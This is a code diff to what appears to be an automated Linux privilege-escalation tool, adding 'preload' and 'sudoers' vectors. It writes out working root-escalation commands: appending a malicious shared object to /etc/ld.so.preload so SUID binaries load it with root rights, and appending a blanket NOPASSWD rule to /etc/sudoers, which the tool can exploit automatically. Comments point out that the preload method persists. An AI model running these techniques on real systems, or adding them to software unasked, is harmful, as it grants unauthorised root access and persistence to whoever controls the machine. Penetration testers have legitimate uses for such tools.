@@ -16,7 +16,7 @@ import (
 var validVectors = map[string]bool{
 	"suid": true, "sgid": true, "sudo": true, "cron": true, "passwd": true, "shadow": true,
 	"docker": true, "container": true, "caps": true, "nfs": true, "path": true, "service": true,
-	"kernel": true, "cred": true,
+	"kernel": true, "cred": true, "preload": true, "sudoers": true,
 }
 
 // parseVectorList splits and validates a comma-separated --vector argument.
@@ -99,6 +99,10 @@ func enumerateAll(p *AutoPrivilege) {
 			enumerateKernelCVE(p, f)
 		case "CRED":
 			enumerateCredential(p, f)
+		case "PRELOAD":
+			enumeratePreload(p, f)
+		case "SUDOERS":
+			enumerateSudoers(p, f)
 		case "PATH":
 			enumeratePATH(p, f)
 		case "SERVICE":
@@ -176,6 +180,14 @@ func enumerateVectors(p *AutoPrivilege, names []string) {
 			case "cred":
 				if f.Source == "CRED" {
 					enumerateCredential(p, f)
+				}
+			case "preload":
+				if f.Source == "PRELOAD" {
+					enumeratePreload(p, f)
+				}
+			case "sudoers":
+				if f.Source == "SUDOERS" {
+					enumerateSudoers(p, f)
 				}
 			}
 		}
@@ -416,6 +428,45 @@ func enumerateCredential(p *AutoPrivilege, f Finding) {
 			RiskMedium,
 			map[string]string{"type": "config-credentials"})
 	}
+}
+
+// --- Preload enumeration ---
+// Only a WRITABLE ld.so.preload yields a vector: entries already configured
+// by someone else are an investigation lead, not an escalation path for the
+// current user. The injection needs a compiled shared object, so the vector
+// is manual — the tool prints the technique and states the compiler
+// requirement instead of pretending it built anything.
+func enumeratePreload(p *AutoPrivilege, f Finding) {
+	if !strings.Contains(f.Description, "writable") {
+		return // informational-only finding: nothing to hand over
+	}
+	addManualVector(p, "ld.so preload injection", "preload", f.Target,
+		"# build a shared object whose constructor drops a root shell (needs gcc on target), then\n"+
+			"printf '/tmp/autopriv.so\\n' >> /etc/ld.so.preload\n"+
+			"sudo true   # any SUID-root binary loads it with euid 0",
+		RiskHigh,
+		map[string]string{"note": "every SUID binary loads the listed objects with euid 0; persistence survives until the entry is removed"})
+}
+
+// --- Sudoers enumeration ---
+// A writable /etc/sudoers itself can be edited in place: ownership and mode
+// survive an append, so sudo keeps accepting the file — this is the AUTO
+// vector. A writable sudoers.d DIRECTORY only lets us CREATE files, and sudo
+// ignores drop-ins not owned by uid 0 — honest manual guidance instead.
+func enumerateSudoers(p *AutoPrivilege, f Finding) {
+	if f.Target == "/etc/sudoers" {
+		addVector(p, "sudoers write", "sudoers", f.Target,
+			"echo 'ALL ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers && sudo -n -i", RiskHigh,
+			func() *ExploitResult {
+				return exploitSudoersWrite(f.Target, p.Opts)
+			},
+			map[string]string{"path": f.Target})
+		return
+	}
+	addManualVector(p, "sudoers.d drop-in", "sudoers", f.Target,
+		fmt.Sprintf("# drop-ins must be root-owned or sudo ignores them — append to an EXISTING root-owned writable file if any, then:\necho 'ALL ALL=(ALL) NOPASSWD: ALL' >> %s/<root-owned-file> && sudo -n -i", f.Target),
+		RiskHigh,
+		map[string]string{"note": "sudo rejects user-owned drop-ins; only existing root-owned writable files inside the directory are usable"})
 }
 
 // --- PATH enumeration (manual: payload must wait for a privileged caller) ---
